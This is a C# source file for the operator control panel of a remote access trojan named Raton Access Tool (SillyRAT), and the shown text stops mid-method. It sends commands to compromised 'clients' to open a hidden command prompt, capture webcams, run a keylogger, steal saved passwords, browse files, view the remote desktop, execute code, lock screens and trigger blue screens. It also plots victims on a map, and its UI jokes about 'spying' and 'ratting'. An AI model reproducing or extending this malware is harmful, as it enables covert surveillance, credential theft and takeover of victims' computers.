using System;
using System.Drawing;
using System.Windows.Forms;
using Newtonsoft.Json;
using Server.Connection;
using System.IO;
using System.Collections.Generic;
using Stuff;
using SillyRAT.ClientForms;
using System.Linq;
using RatonRAT.ClientForms;
using System.Runtime.InteropServices;
using System.Drawing.Drawing2D;
using System.Diagnostics;
using RatonRAT;
using GMap.NET;
using GMap.NET.WindowsForms;
using GMap.NET.MapProviders;
using System.Threading.Tasks;
using System.Text;
using System.Threading;
using System.Net.Http;

namespace SillyRAT
{
    public partial class Form2 : Form
    {
        public static async Task<string> getip()
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    string ip = await client.GetStringAsync("https://api.ipify.org");
                    return ip;
                }
                catch (Exception)
                {
                    return "Unknow";
                }
            }
        }
        private int notis = 0;
        private static string infoPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "DONOTSHARE.json");
        string user = JsonConvert.DeserializeObject<dynamic>(File.ReadAllText(infoPath)).Username;
        string datee = JsonConvert.DeserializeObject<dynamic>(File.ReadAllText(infoPath)).Date;

        private GMapOverlay markersOverlay;

        private bool isMouseDown = false;

        private Point mouseOffset;

        private static UserConfig userConfig;

        private static void LoadConfig()
        {
            string configFilePath = "Data/userConfig.json";
            if (File.Exists(configFilePath))
            {
                string json = File.ReadAllText(configFilePath);
                userConfig = JsonConvert.DeserializeObject<UserConfig>(json);
            }
            else
            {
                userConfig = new UserConfig { audioMute = false, darkMode = false, notificationMute = false };
            }
        }

        private void Form6_MouseDown(object sender, MouseEventArgs e)
        {
            isMouseDown = true;
            mouseOffset = new Point(e.X, e.Y);
        }

        private void Form6_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                label4.Text = "Don't drag me :(";
                this.Opacity = 80;
                this.Location = new Point(this.Left + e.X - mouseOffset.X, this.Top + e.Y - mouseOffset.Y);
            }
        }

        private void Form6_MouseUp(object sender, MouseEventArgs e)
        {
            label4.Text = "Raton Access Tool O_O''";
            isMouseDown = false;
        }

        [DllImport("user32.dll")]
        private static extern bool ShowScrollBar(IntPtr hWnd, int wBar, bool bShow);
        private const int SB_VERT = 1;
        private const int SB_HORZ = 0;
        private System.Windows.Forms.Timer fadeTimer;
        private System.Windows.Forms.Timer unfadeTimer;
        private double opacityIncrement = 0.01;

        public Form2()
        {
            InitializeComponent();
            listView1.GetType().GetProperty("DoubleBuffered",
                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)
                ?.SetValue(listView1, true, null);
            LoadConfig();
        }
        public void Command(string command)
        {
            Pack pack = new Pack();
            pack.Set("Packet", command);
            foreach (SillyClient client in GetSelectedClients())
            {
                client.Send(pack.Pacc());
            }
        }

        private void pfpload()
        {
            string dataFolder = Path.Combine(Application.StartupPath, "Data");
            string[] validExtensions = { ".jpg", ".jpeg", ".png", ".bmp", ".gif" };

            string pathstuff = null;

            foreach (var extension in validExtensions)
            {
                string potentialPath = Path.Combine(dataFolder, "pfp" + extension);
                if (File.Exists(potentialPath))
                {
                    pathstuff = potentialPath;
                    break;
                }
            }

            if (!string.IsNullOrEmpty(pathstuff))
            {
                try
                {
                    Image pfpimg = Image.FromFile(pathstuff);
                    pictureBox1.Image = pfpimg;
                    pictureBox6.Image = pfpimg;
                }
                catch
                {
                    MessageBox.Show("Error: The selected file is not a valid image or could not be loaded", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        public void checkLogs()
        {
            button3.PerformClick();
        }

        private async void Form2_Load(object sender, EventArgs e)
        {
            string greet = "Hi";
            int taim = DateTime.Now.Hour;
            if (taim >= 6 && taim < 13)
                greet = "Good morning, " + user + "!\nManage your clients with a right click!\nWhat a nice way to start the day :D";
            else if (taim >= 13 && taim < 18)
                greet = "Good afternoon, " + user + "!\nManage your clients with a right click!\nEverything is alright in your life? :3";
            else if (taim >= 18 && taim < 21)
                greet = "Good evening, " + user + "!\nManage your clients with a right click!\nStill working? Keep it up!";
            else
                greet = "Good night, " + user + "!\nManage your clients with a right click!\nStop ratting and go to sleep plz :O";

                notifyIcon1.BalloonTipTitle = "Raton Access Tool";
                notifyIcon1.BalloonTipText = greet;
                notifyIcon1.BalloonTipIcon = ToolTipIcon.Info;
                notifyIcon1.ShowBalloonTip(6000);
            
            string ip = await getip();
            label6.Text = "IP: " + ip;
            label4.Text = "Raton Access Tool Profile";
            label1.Text = user;
            label2.Text = user;
            label3.Text = "Spying since " + datee;
            timer1.Start();
            new RatonRAT.Classes.WallpaperMode().Apply(this);
            new RatonRAT.Classes.LightMode().Apply(this);
            listView1.Region = new Region(CreateRoundPath(listView1.ClientRectangle, 10));
            gMapControl1.Region = new Region(CreateRoundPath(gMapControl1.ClientRectangle, 10));
            pictureBox1.Region = new Region(CreateRoundPath(pictureBox1.ClientRectangle, 5));
            pictureBox6.Region = new Region(CreateRoundPath(pictureBox6.ClientRectangle, 20));
            label11.Region = new Region(CreateRoundPath(label11.ClientRectangle, 10));
            label12.Region = new Region(CreateRoundPath(label12.ClientRectangle, 10));
            textBox1.Region = new Region(CreateRoundPath(textBox1.ClientRectangle, 10));
            pictureBox5.Region = new Region(CreateRoundPath(pictureBox5.ClientRectangle, 10));
            listView3.Region = new Region(CreateRoundPath(listView3.ClientRectangle, 10));

            foreach (ColumnHeader column in Program.form2.listView2.Columns)
            {
                column.Width = -2;
            }

            int totalWidth = Program.form2.listView2.ClientSize.Width;
            int columnCount = Program.form2.listView2.Columns.Count;
            if (columnCount > 0)
            {
                int columnWidth = totalWidth / columnCount;
                foreach (ColumnHeader column in Program.form2.listView2.Columns)
                {
                    column.Width = columnWidth;
                }
            }
            ShowWorldMap();
            gMapControl1.Zoom = 3;
            gMapControl1.Zoom = 4;
            markersOverlay = new GMapOverlay("markers");
            gMapControl1.Overlays.Add(markersOverlay);
            pfpload();
            this.MouseDown += Form6_MouseDown;
            this.MouseMove += Form6_MouseMove;
            this.MouseUp += Form6_MouseUp;
            clearLogsToolStripMenuItem.Click += clearLogsToolStripMenuItem_Click;
            buscarToolStripMenuItem.Click += buscarToolStripMenuItemcopiarToolStripMenuItem_Click;
            copiarToolStripMenuItem.Click += copiarToolStripMenuItem_Click;
            copySelectedLogToolStripMenuItem.Click += copySelectedLogToolStripMenuItem_Click;
            listView1.MouseClick += listView1_MouseClick;
            ShowScrollBar(listView1.Handle, SB_VERT, true);
            ShowScrollBar(listView2.Handle, SB_VERT, true);
            ShowScrollBar(listView1.Handle, SB_HORZ, true);
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 10));
        }


        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        public void AddLog(string message, Color color)
        {
            if (listView1.InvokeRequired)
            {
                listView1.Invoke(new Action(() => AddLog(message, color)));
                return;
            }

            string time = DateTime.Now.ToString("hh:mm:ss tt");

            ListViewItem item = new ListViewItem(time);
            item.SubItems.Add(message);
            item.ForeColor = color;
            item.ImageIndex = 0;
            notis++;
            listView1.Items.Add(item);
            foreach (ColumnHeader column in Program.form2.listView1.Columns)
            {
                column.Width = -2;
            }

            int totalWidth = Program.form2.listView1.ClientSize.Width;
            int columnCount = Program.form2.listView1.Columns.Count;
            if (columnCount > 0)
            {
                int columnWidth = totalWidth / columnCount;
                foreach (ColumnHeader column in Program.form2.listView1.Columns)
                {
                    column.Width = columnWidth;
                }
            }
        }



        private void listView1_SelectedIndexChanged(object sender, EventArgs e) { }
        private void FadeIn_Tick(object sender, EventArgs e)
        {
            try
            {
                if (Opacity < 1)
                {
                    this.Invoke(new Action(() =>
                    {
                        Opacity += opacityIncrement;
                    }));
                }
                else
                {
                    fadeTimer.Stop();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
        public void fade()
        {
            fadeTimer = new System.Windows.Forms.Timer
            {
                Interval = 5
            };
            fadeTimer.Tick += FadeIn_Tick;
            fadeTimer.Start();
        }

        public void unfade()
        {
            unfadeTimer = new System.Windows.Forms.Timer
            {
                Interval = 5
            };
            unfadeTimer.Tick += FadeOut_Tick;
            unfadeTimer.Start();
        }

        private void FadeOut_Tick(object sender, EventArgs e)
        {
            try
            {
                if (Opacity > 0)
                {
                    this.Invoke(new Action(() =>
                    {
                        Opacity -= opacityIncrement;
                    }));
                }
                else
                {
                    unfadeTimer.Stop();
                    this.Invoke(new Action(() =>
                    {
                        this.WindowState = FormWindowState.Minimized;
                        this.Opacity = 100;
                    }));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        private void buscarToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
        public void ClearLogs()
        {
            if (InvokeRequired)
            {
                Invoke(new Action(ClearLogs));
            }
            else
            {
                listView1.Items.Clear();
            }
        }

        private void CopyLog()
        {
            if (listView1.SelectedItems.Count > 0)
            {
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text); 
            }
            else
            {
                MessageBox.Show("Press the time of the log to select", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void SearchLog()
        {
            string searchQuery = Microsoft.VisualBasic.Interaction.InputBox("Please enter what you would like to search", "Search Logs", "");

            if (!string.IsNullOrEmpty(searchQuery))
            {
                bool found = false;

                foreach (ListViewItem item in listView1.Items)
                {
                    if (item.SubItems[1].Text.Contains(searchQuery) || item.Text.Contains(searchQuery))
                    {
                        found = true;
                        item.Selected = true; 
                        listView1.EnsureVisible(item.Index); 
                        break; 
                    }
                }

                if (!found)
                {
                    MessageBox.Show("No matching logs found.", "Search Result", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        public class LogEntry
        {
            public string Time { get; set; }
            public string Message { get; set; }
        }

        private void ExportLogsToJson()
        {
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "JSON Files (*.json)|*.json";
                saveFileDialog.Title = "Export Logs";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var logList = new List<LogEntry>();

                    foreach (ListViewItem item in listView1.Items)
                    {
                        var logEntry = new LogEntry
                        {
                            Time = item.Text,  
                            Message = item.SubItems[1].Text  
                        };
                        logList.Add(logEntry);
                    }

                    File.WriteAllText(saveFileDialog.FileName, JsonConvert.SerializeObject(logList, Formatting.Indented));
                    MessageBox.Show("Logs exported successfully", "Raton Access Tool", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void clearLogsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClearLogs();
            string TIMERTEXT = "Log date";
            string MESSAGETEXT = "Message";
            ListViewItem item = new ListViewItem(TIMERTEXT);
            listView1.Items.Add(item);
            item.SubItems.Add(MESSAGETEXT);
        }

        private void copySelectedLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CopyLog();
        }

        private void buscarToolStripMenuItemcopiarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SearchLog();
        }

        private void copiarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ExportLogsToJson();
        }

        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    contextMenuStrip1.Show(listView1, e.Location);
                }
                else
                {
                    contextMenuStrip1.Show(Cursor.Position);
                }
            }
        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void serverToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void sillyRATToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form4 form4 = new Form4();
            form4.Show();
        }

        private void builderToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            Form3 form3 = new Form3();
            form3.Show();
        }

        private void blockClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form5 form5 = new Form5(this);
            form5.Show();
        }

        private void listView2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void textToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void textToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Command("Update");
        }

        private void menu4ToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void clientInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {

            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Client information | Client ID: ";
                FormInformation infoForm = (FormInformation)Application.OpenForms[formname + client.uid];
                if (infoForm == null)
                {
                    infoForm = new FormInformation
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    infoForm.Show();
                    Command("Clientinfo");
                }
            }
        }


        private List<SillyClient> GetSelectedClients()
        {
            List<SillyClient> list = new List<SillyClient>();
            foreach (ListViewItem listViewItem in listView2.SelectedItems)
            {
                if (listViewItem.Tag is SillyClient client)
                {
                    if (string.IsNullOrEmpty(client.uid))
                    {
                        client.uid = listViewItem.SubItems[3].Text;
                    }

                    if (!string.IsNullOrEmpty(client.password) && client.password != "silly20")
                    {
                        using (var passwordForm = new FormLogin())
                        {
                            passwordForm.Password = client.password;
                            passwordForm.SillyClient = client.uid;
                            DialogResult result = passwordForm.ShowDialog();
                            if (result == DialogResult.OK)
                            {
                                list.Add(client);
                                return list;
                            } else
                            {
                                return new List<SillyClient>();
                            }
                        }
                    }
                    list.Add(client);
                }
                else
                {
                    MessageBox.Show("This is NOT a client", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }

            string message = list.Count > 0 ? string.Join("\n", list.Select(c => c.uid)) : "No clients selected";
            Console.WriteLine("User selection | ID: " + message);
            return list;
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Restart");
        }

        private void logOffToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("LogOff");
        }

        private void itemToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Command("Shutdown");
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Kill");
        }

        private void menu3ToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void itemToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            Command("StartShell");
            Program.form2.Invoke(new Action(() =>
            {
                Program.form2.AddLog("The shell session has been sent", Color.White);
            }));
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Hidden Cprompt | Client ID: ";
                FormShell shellForm = (FormShell)Application.OpenForms[formname + client.uid];
                if (shellForm == null)
                {
                    shellForm = new FormShell
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    shellForm.Show();
                }
            }
        }

        private void itemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Webcam | Client ID: ";
                FormWebcam webcamForm = (FormWebcam)Application.OpenForms[formname + client.uid];
                if (webcamForm == null)
                {
                    webcamForm = new FormWebcam
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    webcamForm.Show();
                    Command("GetWebcams");
                }
            }
        }

        private void itemToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Send notepad | Client ID: ";
                FormNotepad formNotepad = (FormNotepad)Application.OpenForms[formname + client.uid];
                if (formNotepad == null)
                {
                    formNotepad = new FormNotepad
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formNotepad.Show();
                }
            }
        }

        private void processSpyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "ProcessSpy");
            pack.Set("Command", "List");

            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Process spy | Client ID: ";
                Formproccess processForm = (Formproccess)Application.OpenForms[formname + client.uid];
                if (processForm == null)
                {
                    processForm = new Formproccess
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    processForm.Show();
                    client.Send(pack.Pacc());
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private async void pictureBox3_Click(object sender, EventArgs e)
        {
            Size targetSize = new Size(1063, 0);
            Size startSize = new Size(1063, 559);
            int delay = 500 / 40;

            for (int i = 0; i <= 40; i++)
            {
                float t = (float)i / 40;
                int width = (int)(startSize.Width + (targetSize.Width - startSize.Width) * t);
                int height = (int)(startSize.Height + (targetSize.Height - startSize.Height) * t);

                this.Size = new Size(width, height);
                await Task.Delay(delay);
            }
            this.WindowState = FormWindowState.Minimized;
            this.Size = new Size(1063, 559);
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "RemoteDesktop");
            pack.Set("Command", "Screens");


            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Remote desktop | Client ID: ";
                FormRemote desktopForm = (FormRemote)Application.OpenForms[formname + client.uid];
                if (desktopForm == null)
                {
                    desktopForm = new FormRemote
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    desktopForm.Show();
                    client.Send(pack.Pacc());
                }
            }
        }

        private void reverseToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Reverse");
        }

        private void normalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Normal");
        }

        private void wallpaperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Wallpaper | Client ID: ";
                FormWallpaper formWallpaper = (FormWallpaper)Application.OpenForms[formname + client.uid];
                if (formWallpaper == null)
                {
                    formWallpaper = new FormWallpaper
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formWallpaper.Show();
                }
            }
        }
        private void funPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Fun panel | Client ID: ";
                FormFun formFun = (FormFun)Application.OpenForms[formname + client.uid];
                if (formFun == null)
                {
                    formFun = new FormFun
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formFun.Show();
                }
            }
        }

        private void gMapControl1_Load(object sender, EventArgs e)
        {

        }

        public void ShowWorldMap()
        {
            gMapControl1.MapProvider = GMapProviders.GoogleMap;
            gMapControl1.Position = new PointLatLng(0, 0);
            gMapControl1.MinZoom = 1;
            gMapControl1.MaxZoom = 11;
            gMapControl1.Zoom = 4;
            gMapControl1.SetPositionByKeywords("world");

            gMapControl1.DragButton = MouseButtons.Left;
            gMapControl1.CanDragMap = true;
            gMapControl1.ShowCenter = false;
            gMapControl1.MouseWheelZoomEnabled = true;
            gMapControl1.MouseWheelZoomType = MouseWheelZoomType.ViewCenter;
        }

        public void AddMarker(GMapMarker marker)
        {
            markersOverlay.Markers.Add(marker);
            gMapControl1.Refresh();
        }

        private void panel3_Paint(object sender, PaintEventArgs e)
        {

        }

        private void requestAdminToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Request");
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Shutdown");
        }

        private void logOffToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Command("LogOff");
        }

        private void restartToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Command("Restart");
        }

        private void visitURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "URL | Client ID: ";
                FornURL formURL = (FornURL)Application.OpenForms[formname + client.uid];
                if (formURL == null)
                {
                    formURL = new FornURL // my bad
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formURL.Show();
                }
            }
        }

        private void itemToolStripMenuItem4_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Port spy | Client ID: ";
                FormPorts formPorts = (FormPorts)Application.OpenForms[formname + client.uid];
                if (formPorts == null)
                {
                    formPorts = new FormPorts
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formPorts.Show();
                    Command("PortSpy");
                }
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Keylogger | Client ID: ";
                FormKeylogger formKeylogger = (FormKeylogger)Application.OpenForms[formname + client.uid];
                if (formKeylogger == null)
                {
                    formKeylogger = new FormKeylogger
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formKeylogger.Show();
                    Command("Keylogger");
                }
            }
        }

        private void passwordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Passwords | Client ID: ";
                FormPassword formPassword = (FormPassword)Application.OpenForms[formname + client.uid];
                if (formPassword == null)
                {
                    formPassword = new FormPassword
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formPassword.Show();
                    Command("GetPassword");
                }
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "Manager");
            pack.Set("Action", "Drives");
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "FM | Client ID: ";
                FormFileManager formFileManager = (FormFileManager)Application.OpenForms[formname + client.uid];
                if (formFileManager == null)
                {
                    formFileManager = new FormFileManager
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formFileManager.Show();
                    client.Send(pack.Pacc());
                }
            }
        }

        private void executeCodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Execute code | Client ID: ";
                FormExecute formExecute = (FormExecute)Application.OpenForms[formname + client.uid];
                if (formExecute == null)
                {
                    formExecute = new FormExecute
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formExecute.Show();
                }
            }
        }

        private void toolStripSeparator4_Click(object sender, EventArgs e)
        {
            Command("BSOD");
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Play audio | Client ID: ";
                FormSound formSound = (FormSound)Application.OpenForms[formname + client.uid];
                if (formSound == null)
                {
                    formSound = new FormSound
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formSound.Show();
                }
            }
        }

        private void screamerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                DialogResult result = MessageBox.Show("DO NOT IGNORE THIS WARNING\nYou are about to run a screamer\nMake sure that the client does not have heart problems\nPlease don't be foolish and choose wisely. Do you really want to continue?", "SCREAMER WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (result == DialogResult.Yes)
                {
                    Command("Screamer");
                }
                else
                {
                    MessageBox.Show("You saved someone's heart", "How mature", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void scanDevicesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("StartShell");
            Program.form2.Invoke(new Action(() =>
            {
                Program.form2.AddLog("The shell session has been sent", Color.White);
            }));
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Hidden Cprompt | Client ID: ";
                FormShell shellForm = (FormShell)Application.OpenForms[formname + client.uid];
                if (shellForm == null)
                {
                    shellForm = new FormShell
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    shellForm.Show();
                    Pack pack = new Pack();
                    pack.Set("Packet", "Shell");
                    pack.Set("Command", "arp -a");
                    client.Send(pack.Pacc());
                }
            }
        }

        private void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Message box | Client ID: ";
                FormMessageBox formMessageBox = (FormMessageBox)Application.OpenForms[formname + client.uid];
                if (formMessageBox == null)
                {
                    formMessageBox = new FormMessageBox
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formMessageBox.Show();
                }
            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
        }

        private void rataManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "plugin manager | Client ID: ";
                FormPlugin formPlugin = (FormPlugin)Application.OpenForms[formname + client.uid];
                if (formPlugin == null)
                {
                    formPlugin = new FormPlugin
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formPlugin.Show();
                }
            }
        }

        private void notesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Notes | Client ID: ";
                Notes notes = (Notes)Application.OpenForms[formname + client.uid];
                if (notes == null)
                {
                    notes = new Notes
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                        clientID = client.uid,
                    };
                    notes.Show();
                }
            }
        }

        private void clearLogsToolStripMenuItem_Click_1(object sender, EventArgs e)
        {

        }

        private class UserConfig
        {
            public bool darkMode { get; set; }
            public bool audioMute { get; set; }
            public bool notificationMute { get; set; }
        }

        private void button10_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            Environment.Exit(0);
        }

        private void disconnectToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Command("Disconnect");
        }

        private void unlockToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Unlock");
        }

        private void lockToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Screen locker | Client ID: ";
                Screenlocker screenlocker = (Screenlocker)Application.OpenForms[formname + client.uid];
                if (screenlocker == null)
                {
                    screenlocker = new Screenlocker
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    screenlocker.Show();
                }
            }
        }

        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void contextMenuStrip2_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {

        }

        private void panel1_Paint_1(object sender, PaintEventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (notis < 10 && notis > 0)
            {
                label12.Visible = true;
                label12.Text = notis.ToString();
            }
            if(notis < 1)
            {
                label12.Visible = false;
                label12.Text = notis.ToString();
            }
            if(notis > 10)
            {
                label12.Text = "9+";
            }
            int totalClients = listView2.Items.Count;
            int onlineClients = listView2.Items.Cast<ListViewItem>()
                .Count(item => item.SubItems.Count > 7 && item.SubItems[7].Text == "Connected");

            label5.Text = onlineClients + "/" + totalClients + " online clients";
            label5.ForeColor = (onlineClients < 1) ? Color.Red : Color.LimeGreen;

            if (totalClients > 0)
            {
                label10.Visible = false;
                label13.Visible = false;
            } else
            {
                label10.Visible = true;
                label13.Visible = true;
            }
            if(onlineClients > 0)
            {
                if (panel1.Visible != true)
                {
                    label11.Visible = true;
                    label11.Text = onlineClients.ToString();
                }
            }
            else
            {
                label11.Visible = false;
            }

            if (listView2.SelectedItems.Count == 1)
            {
                var selectedItem = listView2.SelectedItems[0];

                if (selectedItem.Tag is SillyClient client)
                {
                    if (selectedItem.SubItems[7].Text == "Disconnected")
                    {
                        pictureBox5.BackgroundImage = RatonRAT.Properties.Resources.rat_1f400;
                        pictureBox5.BackgroundImageLayout = ImageLayout.Center;
                        listView3.Items.Clear();
                        ListViewItem item = new ListViewItem("Offline");
                        item.ImageIndex = 1;
                        item.SubItems.Add("This client is offline");
                        listView3.Items.Add(item);
                    }
                    else
                    {
                        Pack pack = new Pack();
                        pack.Set("Packet", "Preview");
                        client.Send(pack.Pacc());
                    }
                }
                else
                {
                    pictureBox5.BackgroundImage = RatonRAT.Properties.Resources.rat_1f400;
                    pictureBox5.BackgroundImageLayout = ImageLayout.Center;
                    listView3.Items.Clear();
                    ListViewItem item = new ListViewItem("Invalid");
                    item.ImageIndex = 1;
                    item.SubItems.Add("This is not a client");
                    listView3.Items.Add(item);
                }
            } else
            {
                pictureBox5.BackgroundImage = RatonRAT.Properties.Resources.rat_1f400;
                pictureBox5.BackgroundImageLayout = ImageLayout.Center;
                listView3.Items.Clear();
                ListViewItem item = new ListViewItem("Waiting client");
                item.ImageIndex = 1;
                item.SubItems.Add("Select one client to see the preview");
                listView3.Items.Add(item);
            }
        }


        private void listView3_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void clientToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void remoteChatToolStripMenuItem_Click(object sender, EventArgs e)
        {

            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Chat | Client ID: ";
                FormChat formchat = (FormChat)Application.OpenForms[formname + client.uid];

                if (formchat == null)
                {
                    formchat = new FormChat
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                        Username = user,
                    };
                    string dataFolder = Path.Combine(Application.StartupPath, "Data");
